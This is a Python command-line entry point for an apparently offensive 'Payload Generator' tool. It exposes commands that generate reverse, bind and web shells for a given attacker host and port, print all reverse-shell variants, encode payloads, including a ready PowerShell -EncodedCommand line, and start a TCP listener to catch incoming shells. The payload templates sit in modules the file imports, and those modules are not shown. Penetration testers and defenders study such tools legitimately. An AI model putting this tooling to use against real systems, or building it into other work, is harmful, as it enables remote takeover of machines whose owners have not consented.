"""Payload Generator — CLI entry point."""
from __future__ import annotations

import sys
import threading
from pathlib import Path

import click

_HERE = Path(__file__).resolve().parent
if str(_HERE) not in sys.path:
    sys.path.insert(0, str(_HERE))

from pgn import shells, encoder
from pgn.listener import listen as _listen


def _banner(title: str) -> None:
    print(f"\n{'='*60}\n  {title}\n{'='*60}\n")


@click.group()
def cli() -> None:
    """PGN — Payload Generator"""


# ── shell group ──────────────────────────────────────────────────────────────

@cli.group()
def shell() -> None:
    """Generate reverse, bind, or web shells."""


@shell.command("reverse")
@click.option("--lhost", required=True, help="Your IP address (attacker machine)")
@click.option("--lport", required=True, type=int, help="Port your listener is on")
@click.option("--type", "lang", default="bash",
              type=click.Choice(shells.REVERSE_LANGUAGES, case_sensitive=False),
              show_default=True)
@click.option("--save", "-o", default=None, help="Save payload to file")
def reverse_shell(lhost: str, lport: int, lang: str, save: str) -> None:
    """Generate a reverse shell payload."""
    p = shells.generate_reverse(lang, lhost, lport)
    _banner(f"Reverse Shell — {lang.upper()}  |  {lhost}:{lport}")
    print(p.content)
    print()
    if save:
        with open(save, "w", encoding="utf-8") as f:
            f.write(p.content)
        print(f"[+] Saved → {save}")


@shell.command("bind")
@click.option("--lport", required=True, type=int, help="Port to bind on the target")
@click.option("--type", "lang", default="netcat",
              type=click.Choice(shells.BIND_LANGUAGES, case_sensitive=False),
              show_default=True)
@click.option("--save", "-o", default=None)
def bind_shell(lport: int, lang: str, save: str) -> None:
    """Generate a bind shell payload."""
    p = shells.generate_bind(lang, lport)
    _banner(f"Bind Shell — {lang.upper()}  |  port {lport}")
    print(p.content)
    print()
    if save:
        with open(save, "w", encoding="utf-8") as f:
            f.write(p.content)
        print(f"[+] Saved → {save}")


@shell.command("webshell")
@click.option("--type", "shell_type", default="php_simple",
              type=click.Choice(shells.WEBSHELL_TYPES, case_sensitive=False),
              show_default=True)
@click.option("--save", "-o", default=None)
def web_shell(shell_type: str, save: str) -> None:
    """Generate a web shell snippet."""
    p = shells.generate_webshell(shell_type)
    _banner(f"Web Shell — {shell_type.upper()}")
    print(p.content)
    print()
    if save:
        with open(save, "w", encoding="utf-8") as f:
            f.write(p.content)
        print(f"[+] Saved → {save}")


@shell.command("all-reverse")
@click.option("--lhost", required=True)
@click.option("--lport", required=True, type=int)
def all_reverse(lhost: str, lport: int) -> None:
    """Print every reverse shell variant."""
    for lang in shells.REVERSE_LANGUAGES:
        p = shells.generate_reverse(lang, lhost, lport)
        print(f"\n--- {lang.upper()} ---")
        print(p.content)


# ── encode ───────────────────────────────────────────────────────────────────

@cli.command()
@click.argument("payload")
@click.option("--format", "fmt", default="base64",
              type=click.Choice(encoder.FORMATS, case_sensitive=False),
              show_default=True)
@click.option("--save", "-o", default=None)
def encode(payload: str, fmt: str, save: str) -> None:
    """Encode a payload string."""
    result = encoder.encode(payload, fmt)
    _banner(f"{fmt.upper()} encoded")
    print(result)
    if fmt == "powershell":
        print(f"\n[*] Run with:  powershell -EncodedCommand {result}")
    print()
    if save:
        with open(save, "w", encoding="utf-8") as f:
            f.write(result)
        print(f"[+] Saved → {save}")


# ── listen ───────────────────────────────────────────────────────────────────

@cli.command("listen")
@click.option("--port", "-p", required=True, type=int, help="TCP port to listen on")
def listen_cmd(port: int) -> None:
    """Start a TCP listener to catch reverse shells."""
    stop = threading.Event()
    try:
        _listen(port, stop, lambda m: print(m, end="", flush=True))
    except KeyboardInterrupt:
        stop.set()
        print("\n[*] Listener stopped.")


if __name__ == "__main__":
    cli()
